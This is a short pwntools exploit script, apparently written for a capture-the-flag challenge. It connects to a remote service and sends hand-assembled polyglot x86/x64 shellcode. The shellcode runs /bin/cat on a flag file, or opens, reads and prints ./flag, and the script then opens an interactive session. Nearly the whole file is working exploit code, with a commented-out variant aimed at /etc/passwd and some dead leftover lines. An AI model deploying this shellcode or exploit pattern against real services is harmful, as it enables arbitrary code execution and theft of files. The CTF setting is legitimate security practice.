#!/usr/bin/env python3

from pwn import *
from pwnlib.asm import asm
from pwnlib.context import context
from pwnlib.gdb import *

r = remote('111.186.57.85', 30011)
# r = process('./sc1_32')

context.os = 'linux'
context.arch = 'amd64'

# gdb.attach(r)

# pwnlib.shellcraft.common.linux.sh()

common_sc = r"""
    xor     eax, eax
    test    eax, eax
    inc     eax
    jnz     x32
    <x64_exploit_codes>
x32:
    <x32_exploit_codes>
"""

x64_codes = ''

x86_codes = "\x31\xc0"  # xorl %eax,%eax
x86_codes += "\x99"  # cdq
x86_codes += "\x52"  # push edx
x86_codes += "\x68\x2f\x63\x61\x74"  # push dword 0x7461632f
x86_codes += "\x68\x2f\x62\x69\x6e"  # push dword 0x6e69622f
x86_codes += "\x89\xe3"  # mov ebx,esp
x86_codes += "\x52"  # push edx
# x86_codes += "\x68\x73\x73\x77\x64"  # push dword 0x64777373
# x86_codes += "\x68\x2f\x2f\x70\x61"  # push dword 0x61702f2f
x86_codes += "\x68\x66\x6c\x61\x67"  # push dword 0x67616C66
x86_codes += "\x89\xe1"  # mov ecx,esp
x86_codes += "\xb0\x0b"  # mov $0xb,%al
x86_codes += "\x52"  # push edx
x86_codes += "\x51"  # push ecx
x86_codes += "\x53"  # push ebx
x86_codes += "\x89\xe1"  # mov ecx,esp
x86_codes += "\xcd\x80"  # int 80h

0x56051 - 0x5603c

check_codes = '\x85\xc0' + \
    '\x40\x75\x4b' + \
    x64_codes + \
    x86_codes

check_codes = "\x31\xc0\x40\x74\x3a\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68" + "\x66\x6c\x61\x67" + "\x68" + "\x2f\x2f\x2f\x2f" + \
    "\x68" + "\x2e\x2f\x2f\x2f" + "\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff" + \
    "\x2e\x2f\x2f\x2f\x2f\x2f\x2f\x66\x6c\x61\x67" + "\x41" + \
    "\x2e\x2f\x2f\x2f\x2f\x2f\x2f\x66\x6c\x61\x67"


# print(asm(common_sc))

# _ = r.recvline()
# _ = r.recvline()
# _ = r.recvline()
# _ = r.recvline()


r.sendline(check_codes)
r.interactive()
